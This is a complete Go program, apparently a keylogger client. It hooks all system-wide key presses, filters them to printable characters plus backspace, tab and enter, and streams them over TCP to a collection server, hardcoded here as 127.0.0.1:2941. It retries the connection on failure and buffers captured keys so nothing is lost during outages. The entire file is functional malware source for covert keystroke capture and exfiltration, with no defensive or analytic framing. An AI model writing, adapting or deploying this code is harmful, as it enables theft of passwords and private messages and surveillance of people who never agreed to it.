package main

import (
	"net"
	"time"

	"github.com/go-vgo/robotgo"
	gohook "github.com/robotn/gohook"
)

// configuration
const (
	HOST, PORT = "127.0.0.1", "2941"
	BUFFER     = 4096
	TYPE       = "tcp"
)

var (
	valid = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\"!£$%^&*()-_=+[{}];:'@#~/?.>,<|\\ ")
)

// establishes a connection to the server.
func establish() net.Conn {
start:
	addr, err := net.ResolveTCPAddr(TYPE, HOST+":"+PORT)
	if err != nil {
		time.Sleep(time.Second * 5)
		goto start
	}
	conn, err := net.DialTCP(TYPE, nil, addr)
	if err != nil {
		time.Sleep(time.Second * 5)
		goto start
	}
	return conn
}

// tracks keys and sends them to the channel.
func track(key chan string) {
	eh := robotgo.EventStart()
	for e := range eh {
		if e.Kind == gohook.KeyDown {
			switch e.Keychar {
			case 8:
				key <- "<backspace>"
			case 9:
				key <- "<tab>"
			case 13:
				key <- "<enter>"
			default:
				for _, k := range valid {
					if e.Keychar == k {
						key <- string(e.Keychar)
						break
					}
				}
			}
		}
	}
}

func main() {
	// track keys
	key := make(chan string)
	go track(key)

	// data buffer in case of disconnection
	buff := ""

restart:
	conn := establish()
	for {
		data := []byte(<-key)
		if len(buff) > 0 {
			data = append([]byte(buff), data...)
			buff = ""
		}
		_, err := conn.Write(data)
		if err != nil {
			buff += string(data)
			goto restart
		}
		_, err = conn.Read(data)
		if err != nil {
			buff += string(data)
			goto restart
		}
	}
}
